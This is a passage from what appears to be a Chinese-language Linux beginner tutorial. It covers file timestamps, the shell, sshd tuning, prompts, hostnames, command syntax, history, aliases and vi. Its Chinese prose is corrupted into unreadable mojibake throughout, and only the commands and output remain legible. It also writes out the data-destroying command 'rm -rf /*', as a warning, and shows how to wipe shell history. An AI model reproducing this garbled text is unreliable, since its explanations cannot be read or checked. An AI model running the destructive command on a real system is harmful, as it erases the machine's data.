ï¼Œlnæ˜¯åˆ›å»ºç¡¬é“¾æ¥çš„æŒ‡ä»¤ã€‚æˆ‘ä»¬ä¸æäº†#ç¬¬ä¸‰æ®µçš„å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¯¥æ–‡ä»¶æ‰€å±ç”¨æˆ·#ç¬¬å››æ®µçš„å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¯¥æ–‡ä»¶æ‰€å±ç”¨æˆ·ç»„#ç¬¬äº”æ®µçš„æ•°å­—ï¼Œè¡¨ç¤ºè¯¥æ–‡ä»¶çš„å¤§å°ï¼Œé»˜è®¤å•ä½ä¸ºBï¼Œå¦‚æœæƒ³æŒ‰ç…§KBæ¥æ˜¾ç¤ºï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡ls -lhæŒ‡ä»¤æ¥æŸ¥çœ‹ã€‚hæ˜¯humançš„æ„æ€ï¼Œä»¥äººç±»å¯è¯»çš„æ–¹å¼æ˜¾ç¤ºï¼Œä¼šè‡ªåŠ¨æŒ‰ç…§æ–‡ä»¶å¤§å°æ¥è®¾å®šæ˜¾ç¤ºå•ä½ã€‚#ç¬¬å…­æ®µåˆ°å€’æ•°ç¬¬äºŒæ®µï¼Œéƒ½æ˜¯è¯¥æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´ï¼Œåªè¦æ”¹åŠ¨äº†æ–‡ä»¶å†…å®¹ï¼Œè¿™ä¸ªæ—¶é—´å°±ä¼šè‡ªåŠ¨å˜ä¸ºä¿®æ”¹æ–‡ä»¶æ—¶çš„æ—¶é—´ã€‚ #å…¶å®linuxç³»ç»Ÿä¼šè®°å½•ä¸‰ä¸ªæ—¶é—´ï¼š # è®¿é—®æ—¶é—´(access time) æ–‡ä»¶è¢«æ‰“å¼€æ—¶è‡ªåŠ¨å˜åŒ–è¿™ä¸ªæ—¶é—´ # ä¿®æ”¹æ—¶é—´(modify time) æ–‡ä»¶å†…å®¹å‘ç”Ÿå˜åŒ–æ—¶è‡ªåŠ¨æ”¹å˜è¿™ä¸ªæ—¶é—´ï¼Œls -l æ˜¾ç¤ºçš„å°±æ˜¯è¿™ä¸ªæ—¶é—´ã€‚ # æ”¹å˜æ—¶é—´(change time) æ–‡ä»¶å±æ€§å‘ç”Ÿå˜åŒ–æ—¶è‡ªåŠ¨æ”¹å˜è¿™ä¸ªæ—¶é—´ï¼Œæ–‡ä»¶å¤§å°ä¹Ÿæ˜¯æ–‡ä»¶çš„å±æ€§ï¼Œæ‰€ä»¥ä¿®æ”¹æ–‡ä»¶å†…å®¹å¯¼è‡´å¤§å°å˜åŒ–çš„æ—¶å€™ï¼Œè¿™ä¸ªæ—¶é—´ä¹Ÿä¼šè‡ªåŠ¨æ”¹å˜ã€‚ 2.10.2æŸ¥çœ‹è®¿é—®æ—¶é—´ã€åˆ›å»ºæ—¶é—´ã€ä¿®æ”¹æ—¶é—´ #windowsç³»ç»Ÿä¹Ÿä¼šè®°å½•ä¸‰ä¸ªæ—¶é—´ï¼šè®¿é—®æ—¶é—´ã€åˆ›å»ºæ—¶é—´ã€ä¿®æ”¹æ—¶é—´ #linuxä¸‹é€šè¿‡statæŒ‡ä»¤æ¥æŸ¥çœ‹ï¼š [root@localhost ~]# stat 1.txt æ–‡ä»¶ï¼š1.txt å¤§å°ï¼š0 å—ï¼š0 IO å—ï¼š4096 æ™®é€šç©ºæ–‡ä»¶ è®¾å¤‡ï¼š801h/2049d Inodeï¼š67108933 ç¡¬é“¾æ¥ï¼š1 æƒé™ï¼š(0644/-rw-r--r--) Uidï¼š( 0/ root) Gidï¼š( 0/ root) æœ€è¿‘è®¿é—®ï¼š2023-03-20 13:32:34.333042228 +0800 æœ€è¿‘æ›´æ”¹ï¼š2023-03-20 13:32:34.333042228 +0800 æœ€è¿‘æ”¹åŠ¨ï¼š2023-03-20 13:32:34.333042228 +0800 åˆ›å»ºæ—¶é—´ï¼š- # æˆ‘ä»¬æ”¹ä¸€ä¸‹æ–‡ä»¶æƒé™ï¼Œç„¶åå†çœ‹æ—¶é—´ [root@localhost ~]# chmod 777 1.txt [root@localhost ~]# stat 1.txt æ–‡ä»¶ï¼š1.txt å¤§å°ï¼š0 å—ï¼š0 IO å—ï¼š4096 æ™®é€šç©ºæ–‡ä»¶ è®¾å¤‡ï¼š801h/2049d Inodeï¼š67108933 ç¡¬é“¾æ¥ï¼š1 æƒé™ï¼š(0777/-rwxrwxrwx) Uidï¼š( 0/ root) Gidï¼š( 0/ root) æœ€è¿‘è®¿é—®ï¼š2023-03-20 13:32:34.333042228 +0800 æœ€è¿‘æ›´æ”¹ï¼š2023-03-20 13:32:34.333042228 +0800 æœ€è¿‘æ”¹åŠ¨ï¼š2023-03-20 13:56:43.005634151 +0800 # æ”¹åŠ¨æ—¶é—´å˜äº† åˆ›å»ºæ—¶é—´ï¼š-#æœ€ä¸€æ®µï¼Œè¯¥æ–‡ä»¶çš„åç§° 2.11 Linux Shell2.11.1 Shellçš„æ„æ€## Shellï¼š è›‹å£³çš„æ„æ€ï¼Œæ˜¯linuxä¸­æ¯”è¾ƒé‡è¦çš„ä¸€ä¸ªæ¦‚å¿µï¼Œæ‰€æœ‰çš„å‘½ä»¤å…¶å®éƒ½ç§°ä¹‹ä¸ºshellå‘½ä»¤ã€‚çœ‹å›¾è§£ï¼šshellå°±æ˜¯å†…æ ¸çš„ä¸€ä¸ªå¤–å£³ï¼Œç”¨æˆ·é€šè¿‡shellæ¥æ§åˆ¶å†…æ ¸è¿›è€Œé©±åŠ¨ç¡¬ä»¶åšäº‹æƒ…ï¼Œè¿™æ˜¯å®ƒåå­—çš„ç”±æ¥ã€‚Linuxä¸‹ï¼Œæ²¡æœ‰shellçš„è¯ï¼Œå°±ä¸èƒ½æ§åˆ¶è¿™ä¸ªè®¡ç®—æœºäº†ï¼Œå› ä¸ºå†…æ ¸æ˜¯ç”¨æˆ·ä¸èƒ½ç›´æ¥æ§åˆ¶çš„ã€‚ ## æˆ‘ä»¬ä½¿ç”¨çš„æ˜¯å“ªä¸ªshellå‘¢ï¼Ÿ # åœ¨/etc/passwdä¸­å°±å¯ä»¥çœ‹åˆ°ï¼š wangwu:x:1002:1002::/home/wangwu:/bin/bash # åé¢è¿™ä¸ª/bin/bashï¼Œå°±æ˜¯æˆ‘ä»¬ç›®å‰ä½¿ç”¨çš„shellï¼Œåé¢æˆ‘ä»¬è¿˜ä¼šæ›´æ¢å…¶ä»–shellæ¥ç©ï¼Œåé¢å†è¯´ã€‚ chrony:x:998:996::/var/lib/chrony:/sbin/nologin # å¦‚æœæŒ‡å®šçš„æ˜¯/sbin/nologinè¿™ä¸ªshellçš„è¯ï¼Œæ˜¯æ²¡æœ‰åŠæ³•ç™»å½•ç³»ç»Ÿçš„ ## shellä¼šå¸®æˆ‘ä»¬æ£€æµ‹è¾“å…¥å’Œè¾“å‡ºçš„å†…å®¹æ˜¯å¦æ­£ç¡® # éšä¾¿è¾“å…¥ç‚¹ä¸œè¥¿ï¼Œä¸€å›è½¦ï¼Œshellå°±æ£€æµ‹åˆ°ä½ è¿™ä¸ªæŒ‡ä»¤ä¸å¯¹ï¼ŒæŠ¥é”™ç»™ä½ çœ‹ [root@localhost ~]# asdf -bash: asdf: æœªæ‰¾åˆ°å‘½ä»¤ 2.11.2 ä¼˜åŒ–sshç™»å½•é€Ÿåº¦## å¦‚æœä½ å‘ç°ä½ çš„xshellæˆ–è€…sshæŒ‡ä»¤è¿æ¥linuxç³»ç»Ÿçš„æ—¶å€™å¾ˆæ…¢ï¼Œç­‰å¥½ä¹…æ‰è¿æ¥æˆåŠŸï¼Œé‚£ä¹ˆå°±å¯ä»¥æŒ‰ç…§ä¸‹é¢çš„æ–¹å¼ä¼˜åŒ–ä¸€ä¸‹ï¼Œç›®å‰æˆ‘ä»¬æ²¡æœ‰é‡åˆ°ï¼Œæ‰€ä»¥è¿™ä¸ªæš‚æ—¶å°±ä¸æäº†ã€‚#ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå…ˆå¤‡ä»½[root@localhost ~]# cp /etc/ssh/sshd_config /tmp/[root@localhost ~]# vi /etc/ssh/sshd_config #ç›´æ¥è¾“å…¥:79å›è½¦ 79 GSSAPIAuthentication no 115 UseDNS noè¾“å…¥:wqä¿å­˜é€€å‡º #é‡å¯sshdæœåŠ¡[root@localhost ~]# systemctl restart sshd#å¦‚æœä¿®æ”¹å¤±è´¥ï¼Œè¿˜åŸé…ç½®æ–‡ä»¶[root@localhost ~]# cp /tmp/sshd_config /etc/ssh/sshd_config[root@localhost ~]# systemctl restart sshd 2.11.3 shellæç¤ºç¬¦#rootç”¨æˆ·æç¤ºç¬¦[root@localhost ~]##æ™®é€šç”¨æˆ·test1çš„æç¤ºç¬¦[test1@localhost ~]$ #æ ¼å¼ï¼š[ç”¨æˆ·å@ä¸»æœºå æ‰€åœ¨ç›®å½•]## 1ã€ç”¨æˆ·åï¼Œè¿™ä¸ªæ²¡è¯´å•¥è¯´çš„# 2ã€ä¸»æœºåï¼šlocalhostæ˜¯ä¸»æœºåï¼Œwindowsç”µè„‘ä¹Ÿæœ‰ä¸»æœºåï¼šæˆ‘çš„ç”µè„‘--å±æ€§--é«˜çº§ç³»ç»Ÿè®¾ç½®--è®¡ç®—æœºåï¼ŒåŒä¸€ä¸ªç½‘ç»œä¸­å¦‚æœæœ‰å¤šå°è®¡ç®—æœºçš„è¯ï¼Œæ¯ä¸ªè®¡ç®—æœºéƒ½åº”è¯¥æœ‰ä¸ªè‡ªå·±çš„åå­—ï¼Œå°±æ˜¯ä¸»æœºåã€‚Linuxä¸»æœºé»˜è®¤å«åšlocalhostï¼Œä¹Ÿæ˜¯å¯ä»¥ä¿®æ”¹çš„ [root@localhost ~]# hostname jaden [root@localhost ~]# logout ## é€€å‡ºä¹‹åï¼Œåœ¨é‡æ–°ç™»å½•ï¼Œå°±çœ‹åˆ°ä¸»æœºåæ”¹å¥½äº†ï¼Œå¦‚ä¸‹ [root@jaden ~]# hostname jaden # 3ã€æ‰€åœ¨ç›®å½•ï¼šrootç™»å½•ä¹‹åï¼Œé»˜è®¤æ‰€åœ¨ç›®å½•æ˜¯/rootï¼Œæ­¤æ—¶~è¡¨ç¤ºçš„/rootç›®å½•ï¼Œå¦‚æœæ˜¯æ™®é€šç”¨æˆ·ç™»å½•çš„ï¼Œé‚£ä¹ˆ~è¡¨ç¤ºçš„æ˜¯ç”¨æˆ·å®¶ç›®å½•ï¼Œcdåˆ‡æ¢ç›®å½•çš„æ—¶å€™ï¼Œæ˜¾ç¤ºçš„å½“å‰æ‰€åœ¨ç›®å½• # rootç”¨æˆ·ï¼š [root@jaden ~]# pwd /root # æ™®é€šç”¨æˆ·ï¼š [zhangsan@jaden ~]$ pwd /home/zhangsan # 4ã€æç¤ºç¬¦å· # ä»£è¡¨å½“å‰ç™»å½•çš„ç”¨æˆ·æ˜¯ç®¡ç†å‘˜,$ä»£è¡¨çš„æ˜¯å½“å‰ç™»å½•ç”¨æˆ·æ˜¯æ™®é€šç”¨æˆ· # æç¤ºç¬¦æ ¼å¼å®šåˆ¶ï¼Œè¿™ä¸ªç®€å•ç†è§£ä¸€ä¸‹å³å¯ï¼Œä¸€èˆ¬éƒ½ä¸æ”¹ # åŸæ ¼å¼ï¼š [root@test ~]# echo $PS1 [\\u@\\h \\W]\\$ # \\uæ˜¯ç”¨æˆ·ï¼Œ\\hæ˜¯ä¸»æœºåï¼Œ\\Wæ˜¯ç›¸å¯¹è·¯å¾„ # ä¸´æ—¶ä¿®æ”¹ï¼šé‡æ–°ç™»å½•å°±åˆè¿˜åŸäº† [root@test ~]#cd /usr/local/bin/ [root@test bin]#export PS1=[\\u@\\h \\w]\\$ # \\wè¡¨ç¤ºç»å¯¹è·¯å¾„ [root@test /usr/local/bin]# #æ°¸ä¹…ä¿®æ”¹ [root@test 10:23:39 /usr/local/bin]#cd [root@test 10:24:25 ~]#vi .bashrc #æ‰¾ä¸ªç©ºç™½çš„åœ°æ–¹ï¼Œæ’å…¥ä¸€è¡Œ export PS1=[\\u@\\h \\t \\w]\\$ #linux PS1å¯ä»¥å„ç§å®šåˆ¶ï¼šå‚è€ƒhttps://www.cnblogs.com/Q--T/p/5394993.html 3-1 ä¸´æ—¶ä¿®æ”¹ä¸»æœºå#ä¸´æ—¶ä¿®æ”¹ä¸»æœºå hostname ä¾‹å­1ï¼š [root@localhost ~]# hostname test #éœ€è¦é‡æ–°ç™»å½•ç”Ÿæ•ˆ 3-2 æŸ¥çœ‹ä¸»æœºçš„ä¿¡æ¯hostnamectl#æŸ¥çœ‹ä¸»æœºçš„ä¿¡æ¯ [root@localhost ~]# hostnamectl Static hostname: localhost.localdomain Icon name: computer-vm Chassis: vm Machine ID: f8a89169114741a8ac6de82954c5fbcb Boot ID: dcf65386ccda42e29699d56101af8cf1 Virtualization: vmware Operating System: CentOS Linux 7 (Core) CPE OS Name: cpe:/o:centos:centos:7 Kernel: Linux 3.10.0-1127.el7.x86_64 Architecture: x86-64 3-3 æ°¸ä¹…ä¿®æ”¹ä¸»æœºå#æ°¸ä¹…ä¿®æ”¹ä¸»æœºå [root@localhost ~]# hostnamectl set-hostname test #éœ€è¦é‡æ–°ç™»å½•ç”Ÿæ•ˆ 3-4 é‡å¯ç³»ç»Ÿ#é‡å¯ç³»ç»Ÿ reboot ä¾‹å­1ï¼š [root@test ~]# reboot 3-5 å…³é—­æˆ–é‡å¯Linux#å…³é—­æˆ–è€…é‡å¯linux shutdown #ç«‹å³å…³æœº [root@localhost ~]# shutdown -h now#5åˆ†é’Ÿä¹‹åå…³æœºï¼Œå¯ä»¥ä½¿ç”¨shutdown -c å–æ¶ˆ [root@localhost ~]# shutdown -h 5#5åˆ†é’Ÿä¹‹åé‡å¯ç³»ç»Ÿï¼Œå¯ä»¥ä½¿ç”¨shutdown -c å– 2.11.4 shellåŸºç¡€è¯­æ³•4-1 ä¸å¸¦å‚æ•°## Linuxçš„æŒ‡ä»¤åŸºæœ¬éƒ½æ˜¯ä¸‹é¢çš„è¯­æ³•ç»“æ„ï¼Œé‡åˆ°ä»€ä¹ˆæŒ‡ä»¤éƒ½ä¸ç”¨æ…Œäº†ã€‚ ##ä¸å¸¦å‚æ•°çš„ï¼š ## rebootã€pwdã€idã€lsç­‰éƒ½å¯ä»¥ä¸æ¥å‚æ•°ï¼Œä¸å¤š 4-2 å¸¦å‚æ•°çš„## å¸¦å‚æ•°çš„ï¼š å‘½ä»¤ å‚æ•° ç›®æ ‡ ls -a -l -h /opt # å‚æ•°è¿˜å¯ä»¥åˆå¹¶ä¸º-alh rm -rf /opt/test1 å‘½ä»¤ æº... ç›®æ ‡ mv æºè·¯å¾„ ç›®æ ‡è·¯å¾„ cp 4-3 æŸ¥çœ‹å‘½ä»¤çš„å‚æ•°# æŸ¥çœ‹å‘½ä»¤çš„å‚æ•°ï¼š å‘½ä»¤ -hæˆ–è€…--help [root@test 11:12:02 /opt]#mv --help ç”¨æ³•ï¼šmv [é€‰é¡¹]... [-T] æºæ–‡ä»¶ ç›®æ ‡æ–‡ä»¶ æˆ–ï¼šmv [é€‰é¡¹]... æºæ–‡ä»¶... ç›®å½• æˆ–ï¼šmv [é€‰é¡¹]... -t ç›®å½• æºæ–‡ä»¶... 4-4 æ ¼å¼å‚æ•°#æ ¼å¼è§£é‡Š ## æ ¼å¼1ï¼šä¸å¸¦å‚æ•°çš„å‘½ä»¤ï¼š ## rebootã€pwdã€idã€lsç­‰éƒ½å¯ä»¥ä¸æ¥å‚æ•°ï¼Œä¸å¤š ## æ ¼å¼2ï¼šå¸¦å‚æ•°ä¸€ä¸ªå‚æ•°çš„æŒ‡ä»¤ï¼š ls -l usermod -h æˆ–è€… usermod --help ## æ ¼å¼3ï¼šå¸¦å¤šä¸ªå‚æ•°çš„æŒ‡ä»¤ï¼š ls -a -l -h # å‚æ•°è¿˜å¯ä»¥åˆå¹¶ä¸º-alh ## æ ¼å¼4ï¼šå¸¦å‚æ•°å¸¦ä¸€ä¸ªç›®æ ‡çš„æŒ‡ä»¤ ls -l /boot rm -rf /tmp/jaden # æ³¨æ„ï¼šåƒä¸‡ä¸è¦rm -rf /* è¿™æ˜¯åˆ é™¤æ ¹ç›®å½•çš„æ„æ€ï¼Œæˆ–è€… rm -rf /tmp/*,å¦‚æœtmpç›®å½•ä¸å­˜åœ¨ï¼Œä¹Ÿæ˜¯åˆ é™¤æ ¹ç›®å½•çš„æ„æ€ã€‚ ## æ ¼å¼5ï¼šå‘½ä»¤å¸¦ä¸€ä¸ªç›®æ ‡ cd /tmp/ ls /tmp/ mkdir jaden useradd jaden ... ## æ ¼å¼6ï¼šå‘½ä»¤å¸¦å¤šä¸ªæºå’Œç›®æ ‡ cp jaden.txt /tmp/11.txt # cp æº1 ç›®æ ‡1 cp 1.txt 2.txt 3.txt /tmp # cp æº1 æº2 æº3 ç›®æ ‡1 ## æ ¼å¼7ï¼šå‘½ä»¤å¸¦å¤šä¸ªå‚æ•°ã€å¤šä¸ªæºå’Œå¤šä¸ªç›®æ ‡ ls -a -l -h /tmp /root /opt cp -a -v /root /root2 # -væ˜¯æ˜¾ç¤ºæ‹·è´è¿‡ç¨‹çš„ï¼Œ-a ä¿ç•™åŸæ–‡ä»¶å±æ€§çš„å‰æä¸‹å¤åˆ¶æ–‡ä»¶ 2.11.5 tabé”®è¡¥å…¨## è¡¥å…¨å‘½ä»¤ï¼š #å¦‚æœé¢„é€‰çš„ç‰¹åˆ«å¤š [root@test 11:25:24 ~]# Display all 1400 possibilities? (y or n) #å¦‚æœé¢„é€‰å°‘ [root@test 11:25:24 ~]#cha chacl chage chattr ## è¡¥å…¨è·¯å¾„ï¼š #å¦‚æœé¢„é€‰çš„ç‰¹åˆ«å¤š [root@test 11:25:24 ~]#cd /etc/ Display all 188 possibilities? (y or n) #å¦‚æœé¢„é€‰å°‘ [root@test 11:25:24 ~]#cd /usr/src/ debug/ kernels/ # è·¯å¾„ä¸å­˜åœ¨çš„è¯å°±è¯´æ˜è·¯å¾„ä¸å­˜åœ¨ 2.11.6 å¿«æ·é”®Ctrl + a #å…‰æ ‡è·³è½¬è‡³æ­£åœ¨è¾“å…¥çš„å‘½ä»¤è¡Œçš„é¦–éƒ¨Ctrl + e #å…‰æ ‡è·³è½¬è‡³æ­£åœ¨è¾“å…¥çš„å‘½ä»¤è¡Œçš„å°¾éƒ¨Ctrl + c #ç»ˆæ­¢å‰å°è¿è¡Œçš„ç¨‹åºï¼Œæ¯”å¦‚pingæŒ‡ä»¤Ctrl + d #åœ¨shellä¸­ï¼Œctrl-dè¡¨ç¤ºæ¨å‡ºå½“å‰shellã€‚Ctrl + z #å°†ä»»åŠ¡æš‚åœï¼ŒæŒ‚è‡³åå°, æ‰§è¡Œfgå‘½ä»¤ç»§ç»­è¿è¡ŒCtrl + l #æ¸…å±ï¼Œå’Œclearå‘½ä»¤ç­‰æ•ˆã€‚Ctrl + k #åˆ é™¤ä»å…‰æ ‡åˆ°è¡Œæœ«çš„æ‰€æœ‰å­—ç¬¦Ctrl + u #åˆ é™¤ä»å…‰æ ‡åˆ°è¡Œé¦–çš„æ‰€æœ‰å­—ç¬¦Ctrl + r #æœç´¢å†å²å‘½ä»¤, åˆ©ç”¨å…³é”®å­—æœç´¢ctrl + w #å…‰æ ‡å¾€å‰åˆ é™¤ä¸€ä¸ªå‚æ•°ï¼Œä»¥ç©ºæ ¼ä¸ºåˆ†å‰²ã€‚ 2.11.7 historyå†å²å‘½ä»¤#å†å² history [root@test 14:32:10 ~]#history 1 exit 2 ls 3 head -1 test03.txt 4 head -1 test03.txt|cat 5 head -1 test03.txt|tac 6 head -2 test03.txt|tac 7 head -2 test03.txt|cat 8 ip addr 9 ip addr|tail -4 10 ip addr|tail -4|head -1 ......#ä½¿ç”¨!è°ƒç”¨å†å²å‘½ä»¤ [root@test 14:32:10 ~]#history|head -5 1 exit 2 ls 3 head -1 test03.txt 4 head -1 test03.txt|cat 5 head -1 test03.txt|tac [root@test 14:32:26 ~]# !3 head -1 test03.txt head: æ— æ³•æ‰“å¼€test03.txt è¯»å–æ•°æ®: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½• #ä½¿ç”¨!è°ƒç”¨mvå¼€å¤´çš„å‘½ä»¤ [root@test 14:42:17 ~]#history 1 ls -a -l .bash_history 2 history 3 ls 4 history 5 mv aaaaa.txt /tmp/ 6 history [root@test 14:42:19 ~]#!mv # æŒ‰å›è½¦ï¼Œä¼šè‡ªåŠ¨æ‰¾æœ€è¿‘ä¸€æ¬¡æ‰§è¡Œçš„mvå¼€å¤´çš„æŒ‡ä»¤ mv aaaaa.txt /tmp/ mv: æ— æ³•è·å–aaaaa.txt çš„æ–‡ä»¶çŠ¶æ€(stat): æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•#æ¸…é™¤å†å²è®°å½• history -c # è¿™æ˜¯æ¸…é™¤å†…å­˜ä¸­çš„å†å²æŒ‡ä»¤ ## åˆ é™¤ä¸»æ–‡ä»¶å¤¹ä¸‹é¢.bash_history # è¿™æ˜¯æ¸…é™¤ç¡¬ç›˜ä¸­çš„å†å²æŒ‡ä»¤ï¼Œå†…å­˜ä¸­çš„æŒ‡ä»¤ä¼šè‡ªåŠ¨å¤‡ä»½åˆ°.bash_historyä¸­ï¼Œä½†æ˜¯æœ‰ä¸ªå»¶è¿Ÿï¼Œé€€å‡ºç™»å½•ä¹‹åï¼Œæ‰ä¼šå°†å†å²æŒ‡ä»¤åŒæ­¥åˆ°ç¡¬ç›˜æ–‡ä»¶ä¸­ ##æ¯ä¸ªç”¨æˆ·å®¶ç›®å½•ä¸‹éƒ½æœ‰ä¸€ä¸ª.bash_historyï¼Œè®°å½•çš„æ˜¯è‡ªå·±ç”¨æˆ·çš„å†å²æŒ‡ä»¤ã€‚ ## .bash_historyé»˜è®¤è®°å½•æœ€è¿‘çš„1000æ¡æŒ‡ä»¤ï¼Œé€šè¿‡echo $HISTSIZEå¯ä»¥æŸ¥çœ‹ï¼Œå¯ä»¥é…ç½®çš„æ›´å¤§æˆ–è€…æ›´å°ä¸€äº›ï¼Œvi /etc/profileï¼Œè¿™ ä¸ªä»¥åå†è¯´ã€‚ 2.11.8 å‘½ä»¤åˆ«å(èŠ±å)#åˆ«å alias # æ¯”å¦‚ï¼šls -l ç›´æ¥å¯ä»¥å†™llå³å¯# æŸ¥çœ‹åˆ«å [root@test 15:23:17 ~]#alias alias cp=cp -i alias egrep=egrep --color=auto alias fgrep=fgrep --color=auto alias grep=grep --color=auto alias l.=ls -d .* --color=auto alias ll=ls -l --color=auto alias ls=ls --color=auto alias mv=mv -i alias rm=rm -i# æ·»åŠ åˆ«å [test1@test 15:24:23 ~]$alias rm=rm -i # -iæ˜¯æç¤ºè­¦å‘Šä¿¡æ¯ç”¨çš„ [test1@test 15:27:08 ~]$alias |grep rm alias rm=rm -i æˆ–è€…ï¼š[test1@test 15:24:23 ~]$alias rm=echo ç¦æ­¢ä½¿ç”¨åˆ é™¤æ“ä½œ# å–æ¶ˆåˆ«å [test1@test 15:27:13 ~]$unalias ls [test1@test 15:27:47 ~]$alias |grep ls ##aliasåˆ«åçš„ä¼˜å…ˆçº§é«˜äºç³»ç»Ÿå‘½ä»¤ ##åˆ«åä¸€å®šè¦æ˜¯å¯æ‰§è¡Œçš„ï¼Œä¸èƒ½éšä¾¿å®šä¹‰åˆ«åï¼Œæ¯”å¦‚jaden=aaaaaaaï¼Œæ‰§è¡Œjadenä¼šæŠ¥é”™ï¼Œæ²¡æœ‰aaaaaaaè¿™ä¸ªæŒ‡ä»¤#aliasæ°¸ä¹…ç”Ÿæ•ˆ [root@localhost ~]# vi .bashrc #ç©ºç™½å¤„ï¼Œå¢åŠ ä¸€è¡Œalias cip=ip addr|tail -4|head -1 2.12 Linuxè¾“å…¥è¾“å‡ºé‡å®šå‘2.12.1 VIç¼–è¾‘å™¨1-1 ç§»åŠ¨å…‰æ ‡## å·¦ï¼Œä¸‹ï¼Œä¸Šï¼Œå³ï¼Œå¦‚æœé”®ç›˜ä¸Šæ²¡æœ‰ä¸Šä¸‹å·¦å³é”®ï¼Œå¯ä»¥h,j,k,l ## è¿›å…¥ç¼–è¾‘æ¨¡å¼æœ‰ä¸‰ä¸ªæŒ‰é’®ï¼šiã€aã€oï¼Œ iåœ¨å…‰æ ‡ä½ç½®ç¼–è¾‘ã€aæ˜¯åœ¨å…‰æ ‡åä¸€ä½ç¼–è¾‘ã€oæ˜¯æ¢è¡Œç¼–è¾‘ï¼Œæ–°èµ·ä¸€è¡Œ ctrl+f ä¸‹ç¿»ä¸€é¡µ ctrl+b ä¸Šç¿»ä¸€é¡µ ctrl+u ä¸Šç¿»åŠé¡µ ctrl+d ä¸‹ç¿»åŠé¡µ## 0 è·³è‡³è¡Œé¦–ï¼Œä¸ç®¡æœ‰æ— ç¼©è¿›ï¼Œå°±æ˜¯è·³åˆ°ç¬¬0ä¸ªå­—ç¬¦## ^ è·³è‡³è¡Œé¦–çš„ç¬¬ä¸€ä¸ªå­—ç¬¦## $ è·³è‡³è¡Œå°¾(shift+4)## gg è·³è‡³æ–‡é¦–## G è·³è‡³æ–‡å°¾(shift+g)## 5gg/5G è°ƒè‡³ç¬¬5è¡Œï¼Œæˆ–è€…å‘½ä»¤è¡Œæ¨¡å¼:5å›è½¦ï¼Œä¹Ÿæ˜¯è·³åˆ°ç¬¬5è¡Œï¼Œæ‰€ä»¥å…¶å®æ“ä½œå‘½ä»¤éƒ½ä¸æ˜¯å”¯ä¸€çš„ 1-2 åˆ é™¤å¤åˆ¶## xåˆ é™¤å•ä¸ªå­—ç¬¦## 10xåˆ é™¤10ä¸ªå­—ç¬¦## dd åˆ é™¤å…‰æ ‡æ‰€åœ¨è¡Œ(å…¶å®ddæ˜¯å‰ªåˆ‡çš„æ“ä½œ), ## ä½¿ç”¨uæ’¤é”€ä¹‹å‰çš„æ“ä½œï¼Œä½¿ç”¨ctrl+ræ¢å¤## 6dd ä»å…‰æ ‡å¼€å§‹å¾€ä¸‹åˆ é™¤6è¡Œ## dw åˆ é™¤ä¸€ä¸ªå•è¯(word)## å°p ç²˜è´´ç²˜è´´æ¿çš„å†…å®¹åˆ°å½“å‰è¡Œçš„ä¸‹é¢ï¼Œæ¯”å¦‚å°†ddå‰ªåˆ‡çš„è¡Œé»è´´åˆ°ä¸‹é¢## å¤§P ç²˜è´´ç²˜è´´æ¿çš„å†…å®¹åˆ°å½“å‰è¡Œçš„ä¸Šé¢## yy å¤åˆ¶è¡Œ## 5yyå¤åˆ¶5è¡Œï¼Œå¤åˆ¶çš„å†…å®¹å¯ä»¥é€šè¿‡p\\Pæ¥é»è´´ 1-3 æœç´¢å’Œæ›¿æ¢## æœç´¢ï¼š /pattern å‘åæœç´¢å­—ç¬¦ä¸²pattern #è¾…åŠ©å°nå‘ä¸‹å’Œå¤§Nå‘ä¸Šï¼Œä¸€èˆ¬éƒ½æ˜¯ç”¨/æ¥æœç´¢ ?pattern å‘å‰æœç´¢å­—ç¬¦ä¸²pattern #è¾…åŠ©å°nå‘ä¸Šå’Œå¤§Nå‘ä¸‹ï¼Œ?æœç´¢ç”¨çš„å°‘## æ›¿æ¢ï¼š :1369s/shell/jaden/g # å°†ç¬¬1369è¡Œçš„shellæ›¿æ¢ä¸ºjadenï¼Œ/è¿˜å¯ä»¥ç”¨#æˆ–è€…@ç¬¦å·æ¥ä»£æ›¿ï¼š:1369s#shell#jaden#g :1369,1379s/shell/jaden/g # å°†1369è‡³1379è¿™10è¡Œä¸­çš„shellæ›¿æ¢ä¸ºjaden :1369,$s/shell/jaden/g # å°†1369è‡³æ–‡æœ«ä¸­çš„shellæ›¿æ¢ä¸ºjaden :%s/old/new/g #æœç´¢æ•´ä¸ªæ–‡ä»¶ï¼Œå°†æ‰€æœ‰çš„oldæ›¿æ¢ä¸ºnew :%s/old/new/gc #æœç´¢æ•´ä¸ªæ–‡ä»¶ï¼Œå°†æ‰€æœ‰çš„oldæ›¿æ¢ä¸ºnewï¼Œæ¯æ¬¡éƒ½è¦ä½ ç¡®è®¤æ˜¯å¦æ›¿æ¢(y/n/a/..)ï¼Œyè¡¨ç¤ºç¡®è®¤æ›¿æ¢ä¸€ä¸ªã€nè¡¨ç¤ºä¸æ›¿æ¢ã€aè¡¨ç¤ºå…¨éƒ¨æ›¿æ¢ 1-4 é€€å‡ºç¼–è¾‘å™¨## :w å°†ç¼“å†²åŒºå†™å…¥æ–‡ä»¶ï¼Œå³ä¿å­˜ä¿®æ”¹åˆ°ç¡¬ç›˜ä¸Šï¼Œä½†æ˜¯ä¸é€€å‡ºviï¼Œå¦‚æœæˆ‘ä»¬æ”¹åˆ°ä¸€åŠçš„æ—¶å€™å¯ä»¥æå‰ä¿å­˜ä¸€ä¸‹ï¼Œä»¥é˜²æ–­ç”µï¼Œå› ä¸ºæ–°ç¼–è¾‘çš„æ•°æ®æ˜¯åœ¨å†…å­˜ä¸­çš„ï¼Œè€Œä¸”viä¸ä¼šè‡ªåŠ¨ä¿å­˜ã€‚## :wq ä¿å­˜ä¿®æ”¹å¹¶é€€å‡º## :x ä¿å­˜ä¿®æ”¹å¹¶é€€å‡ºï¼Œå’Œwqä¸€æ ·çš„æ•ˆæœã€‚## :q é€€å‡ºï¼Œå¦‚æœå¯¹ç¼“å†²åŒºè¿›è¡Œè¿‡ä¿®æ”¹ï¼Œåˆ™ä¼šæç¤º## :q! å¼ºåˆ¶é€€å‡ºï¼Œæ”¾å¼ƒä¿®æ”¹## :wq! å¼ºåˆ¶ä¿å­˜ä¿®æ”¹å¹¶é€€å‡º 1-5 